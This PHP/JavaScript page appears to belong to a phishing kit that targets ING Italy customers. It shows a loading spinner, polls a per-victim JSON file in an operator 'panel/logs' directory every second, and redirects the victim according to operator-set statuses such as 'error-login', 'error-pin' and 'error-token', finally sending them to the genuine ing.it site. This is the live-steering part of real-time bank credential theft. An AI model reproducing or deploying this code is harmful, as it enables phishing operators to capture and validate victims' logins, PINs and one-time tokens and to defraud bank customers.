<?php require_once "../config.php"; ?>
<?php include 'include/header.php'; ?>
<div class="container">
    <?php include 'include/spinner.php'; ?>
</div>
<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<script type="text/javascript">
var ip = '<?php echo $ip; ?>';
var jsonIp = ip.replace(/\./g, '-');
var jsonFile = '../panel/logs/' + jsonIp + '.json';

setInterval(() => {
    $.getJSON(jsonFile, function(data) {
        if (data.redirect_to) {
            var url = data.redirect_to;
            if (data.status === 'error-login' || data.status === 'error-pin' || data.status === 'error-token') {
                url += '?error=true';
            }
            top.location.href = url;
        } else if (data.status === 'success') {
            var redirectUrl = data.redirect_url || 'https://www.ing.it/';
            top.location.href = redirectUrl;
        }
    });
}, 1000);
</script>

</body>

</html>